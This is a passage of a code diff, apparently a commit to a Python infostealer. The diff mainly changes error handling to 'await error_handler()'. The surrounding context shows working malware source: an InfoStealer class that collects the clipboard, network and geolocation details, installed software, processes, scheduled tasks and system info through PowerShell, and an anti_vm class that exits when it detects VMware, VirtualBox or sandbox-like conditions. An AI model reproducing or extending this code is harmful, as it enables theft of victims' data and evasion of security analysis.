         return stdout.decode(errors="ignore")
 
     async def StealLastClipBoard(self) -> None:
@@ -2100,8 +2140,8 @@ class InfoStealer:
             output = await self.get_command_output("powershell.exe Get-Clipboard")
             if output:
                 ListFonction.ClipBoard.append(output)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealNetworkInformation(self) -> None:
         try:
@@ -2114,40 +2154,40 @@ class InfoStealer:
                     timezone = data["timezone"]
                     isp_info = data["isp"] + f" {data['org']} {data['as']}"
                     ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealInstalledSoftware(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
             software_list = json.loads(output)
             ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealProcesses(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
             processes_list = json.loads(output)
             ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealTasks(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
             tasks_list = json.loads(output)
             ListFonction.TasksList.extend([f"TaskName: {task['TaskName']}" for task in tasks_list])
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealSystemInfo(self) -> None:
         try:
             output = await self.get_command_output("powershell.exe Get-ComputerInfo | ConvertTo-Json")
             system_info = json.loads(output)
             ListFonction.SystemInfo.append(f"OS: {system_info['WindowsVersion']}, Architecture: {system_info['ArchitectureType']}")
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
 
 
@@ -2166,7 +2206,7 @@ class anti_vm:
         try:
             await asyncio.gather(*tasks)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_disk_space(self) -> bool:
         try:
@@ -2180,7 +2220,7 @@ class anti_vm:
             if free_space_gb < min_disk_space_gb:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_recent_files(self) -> bool:
         try:
@@ -2188,14 +2228,14 @@ class anti_vm:
             if len(os.listdir(recent_files_folder)) < 20:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_process_count(self) -> None:
         try:
             if len(psutil.pids()) < 50:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_virtual_memory(self) -> None:
         try:
@@ -2203,7 +2243,7 @@ class anti_vm:
             if total_memory_gb < 6:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_for_virtualization(self) -> None:
         try:
@@ -2213,7 +2253,7 @@ class anti_vm:
             if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_for_suspicious_files(self) -> None:
         try:
@@ -2236,7 +2276,7 @@ class anti_vm:
             if running_processes:
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def check_system_manufacturer(self) -> None:
         try:
@@ -2249,7 +2289,7 @@ class anti_vm:
             if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                 ctypes.windll.kernel32.ExitProcess(0)
         except Exception:
-            error_handler()
+            await error_handler()
 
         
 if __name__ == '__main__':
